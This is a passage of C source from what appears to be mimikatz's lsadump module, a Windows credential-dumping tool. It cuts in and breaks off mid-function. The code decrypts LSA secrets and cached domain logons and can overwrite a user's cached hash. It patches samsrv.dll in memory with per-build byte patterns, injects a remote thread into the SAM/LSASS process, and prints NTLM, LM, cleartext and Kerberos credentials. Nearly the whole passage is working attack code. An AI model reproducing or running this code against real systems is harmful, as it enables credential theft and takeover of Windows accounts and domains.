	BYTE digest[MD5_DIGEST_LENGTH];
	CRYPTO_BUFFER data, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, digest};
	LSA_UNICODE_STRING usr;

	if(kuhl_m_lsadump_decryptSecret(hSecurity, hPolicyBase, L"Secrets\\NL$KM\\CurrVal", lsaKeysStream, lsaKeyUnique, &pNLKM, &szNLKM))
	{
		if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Cache", 0, KEY_READ | (pCacheData ? (pCacheData->username ? KEY_WRITE : 0) : 0), &hCache))
		{
			if(lsaKeysStream)
			{
				kprintf(L"\n");
				if(kull_m_registry_RegQueryValueEx(hSecurity, hCache, L"NL$IterationCount", NULL, NULL, (LPBYTE) &i, &szNeeded))
				{
					iter = (i > 10240) ? (i & ~0x3ff) : (i << 10);
					kprintf(L"* NL$IterationCount is %u, %u real iteration(s)\n", i, iter);
					if(!i)
						kprintf(L"* DCC1 mode !\n");
				}
				else kprintf(L"* Iteration is set to default (10240)\n");
			}

			if(kull_m_registry_RegQueryInfoKey(hSecurity, hCache, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
			{
				szMaxValueNameLen++;
				if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
				{
					if(pMsCacheEntry = (PMSCACHE_ENTRY) LocalAlloc(LPTR, szMaxValueLen))
					{
						for(i = 0; i < nbValues; i++)
						{
							szSecretName = szMaxValueNameLen;
							szSecret = szMaxValueLen;
							if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, &type, (LPBYTE) pMsCacheEntry, &szSecret))
							{
								if((_wcsnicmp(secretName, L"NL$Control", 10) == 0) || (_wcsnicmp(secretName, L"NL$IterationCount", 17) == 0) || !(pMsCacheEntry->flags & 1))
									continue;

								kprintf(L"\n[%s - ", secretName);
								kull_m_string_displayLocalFileTime(&pMsCacheEntry->lastWrite);
								kprintf(L"]\nRID       : %08x (%u)\n", pMsCacheEntry->userId, pMsCacheEntry->userId);

								s1 = szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data);
								if(lsaKeysStream) // NT 6
								{
									if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, FALSE))
									{
										kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
										usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
										usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
										if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
										{
											kprintf(L"> User cache replace mode (2)!\n");
											if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter)))
											{
												kprintf(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
												if(kull_m_crypto_hmac(CALG_SHA1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
												{
													kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
													if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, TRUE))
													{
														if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
															kprintf(L"> OK!\n");
														else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
													}
												}
											}
										}
									}
								}
								else // NT 5
								{
									if(kull_m_crypto_hmac(CALG_MD5, pNLKM, szNLKM, pMsCacheEntry->iv, LAZY_IV_SIZE, key.Buffer, MD5_DIGEST_LENGTH))
									{
										data.Length = data.MaximumLength = s1;
										data.Buffer = pMsCacheEntry->enc_data;
										nStatus = RtlEncryptDecryptRC4(&data, &key);
										if(NT_SUCCESS(nStatus))
										{
											kuhl_m_lsadump_printMsCache(pMsCacheEntry, '1');
											usr.Length = usr.MaximumLength = pMsCacheEntry->szUserName;
											usr.Buffer = (PWSTR) ((PBYTE) pMsCacheEntry->enc_data + sizeof(MSCACHE_DATA));
											if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
											{
												kprintf(L"> User cache replace mode (1)!\n");
												if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0)))
												{
													kprintf(L"  MsCacheV1 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
													if(kull_m_crypto_hmac(CALG_MD5, key.Buffer, MD5_DIGEST_LENGTH, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
													{
														kprintf(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
														nStatus = RtlEncryptDecryptRC4(&data, &key);
														if(NT_SUCCESS(nStatus))
														{
															if(kull_m_registry_RegSetValueEx(hSecurity, hCache, secretName, 0, type, (LPBYTE) pMsCacheEntry, szSecret))
																kprintf(L"> OK!\n");
															else PRINT_ERROR_AUTO(L"kull_m_registry_RegSetValueEx");
														}
														else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
													}
												}
											}
										}
										else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
									}
									else PRINT_ERROR_AUTO(L"kull_m_crypto_hmac");
								}
							}
						}
						LocalFree(pMsCacheEntry);
					}
					LocalFree(secretName);
				}
			}
			kull_m_registry_RegCloseKey(hSecurity, hCache);
		}
		LocalFree(pNLKM);
	}
	return TRUE;
}

void kuhl_m_lsadump_printMsCache(PMSCACHE_ENTRY entry, CHAR version)
{
	kprintf(L"User      : %.*s\\%.*s\n",
		entry->szDomainName / sizeof(wchar_t), (PBYTE) entry->enc_data + sizeof(MSCACHE_DATA) + entry->szUserName + 2 * ((entry->szUserName / sizeof(wchar_t)) % 2),
		entry->szUserName / sizeof(wchar_t), (PBYTE) entry->enc_data + sizeof(MSCACHE_DATA)
		);
	kprintf(L"MsCacheV%c : ", version); kull_m_string_wprintf_hex(((PMSCACHE_DATA) entry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
}

void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName)
{
	DWORD szNeeded;
	LPVOID objectName;
	if(kull_m_registry_OpenAndQueryWithAlloc(hSystem, hSystemBase, serviceName, L"ObjectName", NULL, &objectName, &szNeeded))
	{
		kprintf(L" / service \'%s\' with username : %.*s", serviceName, szNeeded / sizeof(wchar_t), objectName);
		LocalFree(objectName);
	}
}

BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecret, IN LPCWSTR KeyName, IN PNT6_SYSTEM_KEYS lsaKeysStream, IN PNT5_SYSTEM_KEY lsaKeyUnique, IN PVOID * pBufferOut, IN PDWORD pSzBufferOut)
{
	BOOL status = FALSE;
	DWORD szSecret = 0;
	PVOID secret;
	CRYPTO_BUFFER data, output = {0, 0, NULL}, key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};

	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hSecret, KeyName, NULL, NULL, &secret, &szSecret))
	{
		if(lsaKeysStream)
		{
			if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) secret, szSecret, lsaKeysStream, NULL))
			{
				*pSzBufferOut = ((PNT6_HARD_SECRET) secret)->clearSecret.SecretSize;
				if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
				{
					status = TRUE;
					RtlCopyMemory(*pBufferOut, ((PNT6_HARD_SECRET) secret)->clearSecret.Secret, *pSzBufferOut);
				}
			}
		}
		else if(lsaKeyUnique)
		{
			key.Buffer = lsaKeyUnique->key;
			data.Length = data.MaximumLength = ((PNT5_HARD_SECRET) secret)->encryptedStructSize;
			data.Buffer = (PBYTE) secret + szSecret - data.Length; // dirty hack to not extract x64/x86 from REG ; // ((PNT5_HARD_SECRET) secret)->encryptedSecret;
			if(RtlDecryptDESblocksECB(&data, &key, &output) == STATUS_BUFFER_TOO_SMALL)
			{
				if(output.Buffer = (PBYTE) LocalAlloc(LPTR, output.Length))
				{
					output.MaximumLength = output.Length;
					if(NT_SUCCESS(RtlDecryptDESblocksECB(&data, &key, &output)))
					{
						*pSzBufferOut = output.Length;
						if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
						{
							status = TRUE;
							RtlCopyMemory(*pBufferOut, output.Buffer, *pSzBufferOut);
						}
					}
					LocalFree(output.Buffer);
				}
			}
		}
		LocalFree(secret);
	}
	return status;
}

void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName)
{
	UNICODE_STRING candidateString = {(USHORT) szBytesSecrets, (USHORT) szBytesSecrets, (PWSTR) bufferSecret};
	BOOL isStringOk = FALSE;
	PVOID bufferHash[SHA_DIGEST_LENGTH]; // ok for NTLM too
	if(bufferSecret && szBytesSecrets)
	{
		kprintf(L"%s", prefix);
		if(szBytesSecrets <= USHRT_MAX)
			if(isStringOk = kull_m_string_suspectUnicodeString(&candidateString))
				kprintf(L"text: %wZ", &candidateString);

		if(!isStringOk)
		{
			kprintf(L"hex : ");
			kull_m_string_wprintf_hex(bufferSecret, szBytesSecrets, 1);
		}

		if(_wcsicmp(secretName, L"$MACHINE.ACC") == 0)
		{
			if(kull_m_crypto_hash(CALG_MD4, bufferSecret, szBytesSecrets, bufferHash, MD4_DIGEST_LENGTH))
			{
				kprintf(L"\n    NTLM:");
				kull_m_string_wprintf_hex(bufferHash, MD4_DIGEST_LENGTH, 0);
			}
			if(kull_m_crypto_hash(CALG_SHA1, bufferSecret, szBytesSecrets, bufferHash, SHA_DIGEST_LENGTH))
			{
				kprintf(L"\n    SHA1:");
				kull_m_string_wprintf_hex(bufferHash, SHA_DIGEST_LENGTH, 0);
			}
		}
		else if((_wcsicmp(secretName, L"DPAPI_SYSTEM") == 0) && (szBytesSecrets == sizeof(DWORD) + 2 * SHA_DIGEST_LENGTH))
		{
			kprintf(L"\n    full: ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), 2 * SHA_DIGEST_LENGTH, 0);
			kprintf(L"\n    m/u : ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD), SHA_DIGEST_LENGTH, 0);
			kprintf(L" / ");
			kull_m_string_wprintf_hex((PBYTE) bufferSecret + sizeof(DWORD) + SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH, 0);
		}
	}
}

BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecretBlobSize, PNT6_SYSTEM_KEYS lsaKeysStream, PBYTE sysKey)
{
	BOOL status = FALSE;
	BYTE keyBuffer[AES_256_KEY_SIZE];
	DWORD i, offset, szNeeded;
	HCRYPTPROV hContext;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	PBYTE pKey = NULL;
	PNT6_SYSTEM_KEY lsaKey;

	if(lsaKeysStream)
	{
		for(i = 0, offset = 0; i < lsaKeysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + lsaKey->KeySize)
		{
			lsaKey = (PNT6_SYSTEM_KEY) ((PBYTE) lsaKeysStream->Keys + offset);
			if(RtlEqualGuid(&hardSecretBlob->KeyId, &lsaKey->KeyId))
			{
				pKey = lsaKey->Key;
				szNeeded = lsaKey->KeySize;
				break;
			}
		}
	}
	else if(sysKey)
	{
		pKey = sysKey;
		szNeeded = SYSKEY_LENGTH;
	}

	if(pKey)
	{
		if(CryptAcquireContext(&hContext, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
		{
			if(CryptCreateHash(hContext, CALG_SHA_256, 0, 0, &hHash))
			{
				CryptHashData(hHash, pKey, szNeeded, 0);
				for(i = 0; i < 1000; i++)
					CryptHashData(hHash, hardSecretBlob->lazyiv, LAZY_NT6_IV_SIZE, 0);
				
				szNeeded = sizeof(keyBuffer);
				if(CryptGetHashParam(hHash, HP_HASHVAL, keyBuffer, &szNeeded, 0))
				{
					if(kull_m_crypto_hkey(hContext, CALG_AES_256, keyBuffer, sizeof(keyBuffer), 0, &hKey, NULL))
					{
						i = CRYPT_MODE_ECB;
						if(CryptSetKeyParam(hKey, KP_MODE, (LPCBYTE) &i, 0))
						{
							szNeeded = hardSecretBlobSize - FIELD_OFFSET(NT6_HARD_SECRET, encryptedSecret);
							status = CryptDecrypt(hKey, 0, FALSE, 0, hardSecretBlob->encryptedSecret, &szNeeded);
							if(!status)
								PRINT_ERROR_AUTO(L"CryptDecrypt");
						}
						else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
						CryptDestroyKey(hKey);
					}
					else PRINT_ERROR_AUTO(L"kull_m_crypto_hkey");
				}
				CryptDestroyHash(hHash);
			}
			CryptReleaseContext(hContext, 0);
		}
	}
	return status;
}

#ifdef _M_X64
BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0x49, 0x8d, 0x41, 0x20};
BYTE PATC_WIN5_NopNop[]								= {0x90, 0x90};
BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
KULL_M_PATCH_GENERIC SamSrvReferences[] = {
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WIN5_NopNop),		PATC_WIN5_NopNop},		{-17}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-24}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-21}},
	{KULL_M_WIN_BUILD_10_1707,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-19}},
};
#elif defined _M_IX86
BYTE PTRN_WALL_SampQueryInformationUserInternal[]	= {0xc6, 0x40, 0x22, 0x00, 0x8b};
BYTE PATC_WALL_JmpShort[]							= {0xeb, 0x04};
KULL_M_PATCH_GENERIC SamSrvReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-12}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-8}},
	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-12}},
};
#endif
PCWCHAR szSamSrv = L"samsrv.dll", szLsaSrv = L"lsasrv.dll", szNtDll = L"ntdll.dll", szKernel32 = L"kernel32.dll", szAdvapi32 = L"advapi32.dll";
NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
{
	NTSTATUS status, enumStatus;

	LSA_OBJECT_ATTRIBUTES objectAttributes;
	LSA_HANDLE hPolicy;
	PPOLICY_ACCOUNT_DOMAIN_INFO pPolicyDomainInfo;
	SAMPR_HANDLE hSam, hDomain;
	PSAMPR_RID_ENUMERATION pEnumBuffer = NULL;
	DWORD CountRetourned, EnumerationContext = 0;
	DWORD rid, i;
	UNICODE_STRING uName;
	PCWCHAR szRid = NULL, szName = NULL;
	PUNICODE_STRING puName = NULL;
	PDWORD pRid = NULL, pUse = NULL;

	PKULL_M_MEMORY_HANDLE hMemory = NULL;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleSamSrv;
	HANDLE hSamSs = NULL;
	KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;
	PKULL_M_PATCH_GENERIC currentSamSrvReference;
	
	KULL_M_MEMORY_ADDRESS aRemoteFunc;
	PKULL_M_MEMORY_ADDRESS aRemoteThread = NULL;
	
	static BOOL isPatching = FALSE;	

	REMOTE_EXT extensions[] = {
		{szSamSrv,	"SamIConnect",						(PVOID) 0x4141414141414141, NULL},
		{szSamSrv,	"SamrCloseHandle",					(PVOID) 0x4242424242424242, NULL},
		{szSamSrv,	"SamIRetrievePrimaryCredentials",	(PVOID) 0x4343434343434343, NULL},
		{szSamSrv,	"SamrOpenDomain",					(PVOID) 0x4444444444444444, NULL},
		{szSamSrv,	"SamrOpenUser",						(PVOID) 0x4545454545454545, NULL},
		{szSamSrv,	"SamrQueryInformationUser",			(PVOID) 0x4646464646464646, NULL},
		{szSamSrv,	"SamIFree_SAMPR_USER_INFO_BUFFER",	(PVOID) 0x4747474747474747, NULL},
		{szKernel32,"VirtualAlloc",						(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
		{szKernel32,"LocalFree",						(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
		{szNtDll,	"memcpy",							(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
		{szKernel32,"LocalAlloc",						(PVOID) 0x4d4d4d4d4d4d4d4d, NULL},
	};
	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
	
	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
	{
		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), MIMIKATZ_NT_BUILD_NUMBER))
		{
			aPatternMemory.address = currentSamSrvReference->Search.Pattern;
			aPatchMemory.address = currentSamSrvReference->Patch.Pattern;

			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"samsrv.dll", &iModuleSamSrv))
				{
					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
					sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
					isPatching = TRUE;
					if(!kull_m_patch(&sMemory, &aPatternMemory, currentSamSrvReference->Search.Length, &aPatchMemory, currentSamSrvReference->Patch.Length, currentSamSrvReference->Offsets.off0, kuhl_m_lsadump_lsa, argc, argv, NULL))
						PRINT_ERROR_AUTO(L"kull_m_patch");
					isPatching = FALSE;
				}
				else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
			}
		}
	}
	else
	{
		if(!isPatching && kull_m_string_args_byName(argc, argv, L"inject", NULL, NULL))
		{
			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD))
			{
				if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_sekurlsa_samsrv_thread, (DWORD) ((PBYTE) kuhl_sekurlsa_samsrv_thread_end - (PBYTE) kuhl_sekurlsa_samsrv_thread), &extForCb, &aRemoteFunc))
					aRemoteThread = &aRemoteFunc;
				else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
			}
		}
		RtlZeroMemory(&objectAttributes, sizeof(LSA_OBJECT_ATTRIBUTES));
		if(NT_SUCCESS(LsaOpenPolicy(NULL, &objectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy)))
		{
			if(NT_SUCCESS(LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID *) &pPolicyDomainInfo)))
			{
				status = SamConnect(NULL, &hSam, 0x000F003F, FALSE);
				if(NT_SUCCESS(status))
				{
					status = SamOpenDomain(hSam, 0x705, pPolicyDomainInfo->DomainSid, &hDomain);
					if(NT_SUCCESS(status))
					{
						kprintf(L"Domain : %wZ / ", &pPolicyDomainInfo->DomainName);
						kull_m_string_displaySID(pPolicyDomainInfo->DomainSid);
						kprintf(L"\n");
						
						if(kull_m_string_args_byName(argc, argv, L"id", &szRid, NULL))
						{
							if(rid = wcstoul(szRid, NULL, 0))
							{
								status = SamLookupIdsInDomain(hDomain, 1, &rid, &puName, &pUse);
								if(NT_SUCCESS(status))
								{
									kuhl_m_lsadump_lsa_user(hDomain, pPolicyDomainInfo->DomainSid, rid, puName, aRemoteThread);
									SamFreeMemory(puName);
									SamFreeMemory(pUse);
								} else PRINT_ERROR(L"SamLookupIdsInDomain %08x\n", status);
							}
							else PRINT_ERROR(L"\'%s\' is not a valid Id\n", szRid);

						}
						else if(kull_m_string_args_byName(argc, argv, L"name", &szName, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szName, NULL))
						{
							RtlInitUnicodeString(&uName, szName);
							status = SamLookupNamesInDomain(hDomain, 1, &uName, &pRid, &pUse);
							if(NT_SUCCESS(status))
							{
								kuhl_m_lsadump_lsa_user(hDomain, pPolicyDomainInfo->DomainSid, *pRid, &uName, aRemoteThread);
								SamFreeMemory(pRid);
								SamFreeMemory(pUse);
							} else PRINT_ERROR(L"SamLookupNamesInDomain %08x\n", status);
						}
						else
						{
							do
							{
								enumStatus = SamEnumerateUsersInDomain(hDomain, &EnumerationContext, 0, &pEnumBuffer, 100, &CountRetourned);
								if(NT_SUCCESS(enumStatus) || enumStatus == STATUS_MORE_ENTRIES)
								{
									for(i = 0; i < CountRetourned; i++)
										kuhl_m_lsadump_lsa_user(hDomain, pPolicyDomainInfo->DomainSid, pEnumBuffer[i].RelativeId, &pEnumBuffer[i].Name, aRemoteThread);
									SamFreeMemory(pEnumBuffer);
								} else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x\n", enumStatus);
							} while(enumStatus == STATUS_MORE_ENTRIES);
						}
						SamCloseHandle(hDomain);
					} else PRINT_ERROR(L"SamOpenDomain %08x\n", status);
					SamCloseHandle(hSam);
				} else PRINT_ERROR(L"SamConnect %08x\n", status);
				LsaFreeMemory(pPolicyDomainInfo);
			}
			LsaClose(hPolicy);
		}

		if(aRemoteThread)
			kull_m_memory_free(aRemoteThread, 0);
	}

	if(hMemory)
	{
		if(hMemory->pHandleProcess->hProcess)
			CloseHandle(hMemory->pHandleProcess->hProcess);
		kull_m_memory_close(hMemory);
	}
	return status;
}

BOOL kuhl_m_lsadump_lsa_getHandle(PKULL_M_MEMORY_HANDLE * hMemory, DWORD Flags)
{
	BOOL success = FALSE;
	SERVICE_STATUS_PROCESS ServiceStatusProcess;
	HANDLE hProcess;

	if(kull_m_service_getUniqueForName(L"SamSs", &ServiceStatusProcess))
	{
		if(hProcess = OpenProcess(Flags, FALSE, ServiceStatusProcess.dwProcessId))
		{
			if(!(success = kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, hMemory)))
				CloseHandle(hProcess);
		}
		else PRINT_ERROR_AUTO(L"OpenProcess");
	}
	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
	return success;
}


void kuhl_m_lsadump_lsa_user(SAMPR_HANDLE DomainHandle, PSID DomainSid, DWORD rid, PUNICODE_STRING name, PKULL_M_MEMORY_ADDRESS aRemoteThread)
{
	SAMPR_HANDLE hUser;
	PSAMPR_USER_INFO_BUFFER pUserInfoBuffer;
	NTSTATUS status;
	DWORD BufferSize = 0, i;
	PLSA_SUPCREDENTIALS pCreds = NULL;
	PLSA_SUPCREDENTIAL pCred;
	PREMOTE_LIB_INPUT_DATA iData;
	REMOTE_LIB_OUTPUT_DATA oData;

	kprintf(L"\nRID  : %08x (%u)\nUser : %wZ\n", rid, rid, name);

	if(!aRemoteThread)
	{
		status = SamOpenUser(DomainHandle, 0x31b, rid, &hUser);
		if(NT_SUCCESS(status))
		{
			status = SamQueryInformationUser(hUser, UserInternal1Information, &pUserInfoBuffer);
			if(NT_SUCCESS(status))
			{
				kprintf(L"LM   : ");
				if(pUserInfoBuffer->Internal1.LmPasswordPresent)
					kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.LMHash, LM_NTLM_HASH_LENGTH, 0);
				kprintf(L"\nNTLM : ");
				if(pUserInfoBuffer->Internal1.NtPasswordPresent)
					kull_m_string_wprintf_hex(pUserInfoBuffer->Internal1.NTHash, LM_NTLM_HASH_LENGTH, 0);
				kprintf(L"\n");
				SamFreeMemory(pUserInfoBuffer);
			} else PRINT_ERROR(L"SamQueryInformationUser %08x\n", status);
			SamCloseHandle(hUser);
		} else PRINT_ERROR(L"SamOpenUser %08x\n", status);
	}
	else
	{
		if(iData = kull_m_remotelib_CreateInput(NULL, rid, GetLengthSid(DomainSid), DomainSid))
		{
			if(kull_m_remotelib_create(aRemoteThread, iData, &oData))
			{
				if(pCreds = (PLSA_SUPCREDENTIALS) oData.outputData)
				{
					for(i = 0; i < pCreds->count; i++)
					{
						pCred = ((PLSA_SUPCREDENTIAL) ((PBYTE) pCreds + sizeof(LSA_SUPCREDENTIALS))) + i;
						if(pCred->offset && pCred->size)
							kuhl_m_lsadump_lsa_DescrBuffer(pCred->type, rid, (PBYTE) pCreds + pCred->offset, pCred->size);
					}
					LocalFree(pCreds);
				}
			}
			LocalFree(iData);
		}
	}
}

PCWCHAR KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[] = {L"Primary", L"CLEARTEXT", L"WDigest", L"Kerberos", L"Kerberos-Newer-Keys", L"NTLM-Strong-NTOWF"};
void kuhl_m_lsadump_lsa_DescrBuffer(DWORD type, DWORD rid, PVOID Buffer, DWORD BufferSize)
{
	DWORD i;
	PWDIGEST_CREDENTIALS pWDigest;
	PKERB_STORED_CREDENTIAL pKerb;
	PKERB_KEY_DATA pKeyData;
	PKERB_STORED_CREDENTIAL_NEW pKerbNew;
	PKERB_KEY_DATA_NEW pKeyDataNew;
	PKIWI_SAMPR_USER_INTERNAL42_INFORMATION pUserInfos;
	PKIWI_LSA_PRIVATE_DATA pData;

	kprintf(L"\n * %s\n", (type < ARRAYSIZE(KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE)) ? KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[type] : L"unknown");
	switch(type)
	{
	case 0:
		pUserInfos = (PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) Buffer;
		kprintf(L"    NTLM : ");
		if(pUserInfos->Internal1.NtPasswordPresent)
			kull_m_string_wprintf_hex(pUserInfos->Internal1.NTHash, LM_NTLM_HASH_LENGTH, 0);
		kprintf(L"\n    LM   : ");
		if(pUserInfos->Internal1.LmPasswordPresent)
			kull_m_string_wprintf_hex(pUserInfos->Internal1.LMHash, LM_NTLM_HASH_LENGTH, 0);
		kprintf(L"\n");
		if(pUserInfos->cbPrivate)
		{
			pData = (PKIWI_LSA_PRIVATE_DATA) pUserInfos->Private;
			if(pData->NtLength)
				kuhl_m_lsadump_dcsync_decrypt(pData->NtHash, LM_NTLM_HASH_LENGTH, rid, L"NTLM", FALSE);
			if(pData->NtHistoryLength)
				kuhl_m_lsadump_dcsync_decrypt(pData->Data, pData->NtHistoryLength, rid, L"ntlm", TRUE);
			if(pData->LmLength)
				kuhl_m_lsadump_dcsync_decrypt(pData->LmHash, LM_NTLM_HASH_LENGTH, rid, L"LM  ", FALSE);
			if(pData->LmHistoryLength)
				kuhl_m_lsadump_dcsync_decrypt(pData->Data + pData->NtHistoryLength, pData->LmHistoryLength, rid, L"lm  ", TRUE);
		}
		break;
	case 1:
		kprintf(L"    %.*s\n", BufferSize / sizeof(wchar_t), Buffer);
		break;
	case 2:
